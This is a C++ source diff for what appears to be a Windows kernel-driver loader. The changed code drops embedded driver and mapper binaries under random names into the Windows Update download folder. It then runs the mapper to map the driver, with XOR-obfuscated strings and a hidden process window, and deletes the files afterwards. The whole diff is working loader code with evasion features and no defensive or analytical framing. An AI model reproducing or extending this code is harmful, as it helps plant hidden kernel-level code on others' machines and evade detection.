@@ -1,4 +1,6 @@
 #pragma once
+#include <filesystem>
+#include <fstream>
 #include "shellcode.h"
 
 #define patch_shell   xor_w(L"\\SoftwareDistribution\\Download\\")
@@ -71,18 +73,24 @@ wstring get_exe_directory()
 	return sz_dir;
 }
 
-wstring get_files_directory()
-{
+filesystem::path get_files_directory() {
+	auto sysdir = std::getenv("SystemRoot");
+	if (!sysdir)
+		return {};
+
+    return filesystem::path(sysdir) / xor_w(L"SoftwareDistribution") / xor_w("Download");
+
+#if 0
 	WCHAR system_dir[256];
 	GetWindowsDirectoryW(system_dir, 256);
 	wstring sz_dir = (wstring(system_dir) + xor_w(L"\\SoftwareDistribution\\Download\\"));
 	return sz_dir;
+#endif
 }
 
-wstring get_random_file_name_directory(wstring type_file)
+filesystem::path get_random_file_name_directory(wstring type_file)
 {
-	wstring sz_file = get_files_directory() + random_string_w() + type_file;
-	return sz_file;
+	return get_files_directory() / (random_string_w() + type_file);
 }
 
 //void run_us_admin(std::wstring sz_exe, bool show)
@@ -95,7 +103,7 @@ wstring get_random_file_name_directory(wstring type_file)
 //	ShellExecuteW(NULL, xor_w(L"runas"), sz_exe.c_str(), sz_params.c_str(), NULL, show);
 //}
 
-bool create_process(const wstring& FileName, const wstring& Command = {}, BOOL Wait = TRUE, BOOL NoWindow = FALSE) {
+bool create_process(const wstring& FileName, const wstring& Command = {}, BOOL Wait = TRUE, BOOL NoWindow = TRUE) {
 	PROCESS_INFORMATION piProcInfo;
 	STARTUPINFOW siStartInfo;
 
@@ -143,8 +151,15 @@ bool create_process(const wstring& FileName, const wstring& Command = {}, BOOL W
 }
 
 
-bool drop_mapper(wstring path)
-{
+bool drop_mapper(filesystem::path path) {
+	ofstream f(path, std::ios::binary);
+	if (!f.is_open())
+		return false;
+
+	f.write(reinterpret_cast<const char*>(shell_mapper), sizeof(shell_mapper));
+	return true;
+
+#if 0
 	HANDLE h_file;
 	BOOLEAN b_status = FALSE;
 	DWORD byte = 0;
@@ -161,12 +176,21 @@ bool drop_mapper(wstring path)
 
 	if (!b_status)
 		return false;
+#endif
 
 	return true;
 }
 
 bool drop_driver(wstring path)
 {
+	ofstream f(path, std::ios::binary);
+	if (!f.is_open())
+		return false;
+
+	f.write(reinterpret_cast<const char*>(shell_driver), sizeof(shell_driver));
+	return true;
+
+#if 0
 	HANDLE h_file;
 	BOOLEAN b_status = FALSE;
 	DWORD byte = 0;
@@ -183,6 +207,7 @@ bool drop_driver(wstring path)
 
 	if (!b_status)
 		return false;
+#endif
 
 	return true;
 }
@@ -194,15 +219,17 @@ wstring get_files_path()
 	return (wstring(system_dir) + patch_shell);
 }
 
-bool mmap_driver()
-{
+bool mmap_driver() {
 	bool result{};
-	wstring sz_driver = get_random_file_name_directory(xor_w(L".sys"));
-	wstring sz_mapper = get_random_file_name_directory(xor_w(L".exe"));
-	wstring sz_params_map = xor_w(L"-map ") + sz_driver;
+	auto sz_driver = get_random_file_name_directory(xor_w(L".sys"));
+	auto sz_mapper = get_random_file_name_directory(xor_w(L".exe"));
+	auto sz_params_map = xor_w(L"-map \"") + sz_driver.wstring() + xor_w(L"\" > nul");
 
-	DeleteFileW(sz_driver.c_str());
-	DeleteFileW(sz_mapper.c_str());
+	// DeleteFileW(sz_driver.c_str());
+	// DeleteFileW(sz_mapper.c_str());
+
+	filesystem::remove(sz_driver);
+	filesystem::remove(sz_mapper);
 
 	while (true) {
 		if (!drop_driver(sz_driver))
@@ -218,8 +245,11 @@ bool mmap_driver()
 		break;
 	}
 
-	DeleteFileW(sz_driver.c_str());
-	DeleteFileW(sz_mapper.c_str());
+	filesystem::remove(sz_driver);
+	filesystem::remove(sz_mapper);
+
+	// DeleteFileW(sz_driver.c_str());
+	// DeleteFileW(sz_mapper.c_str());
 
 	return result;
 }
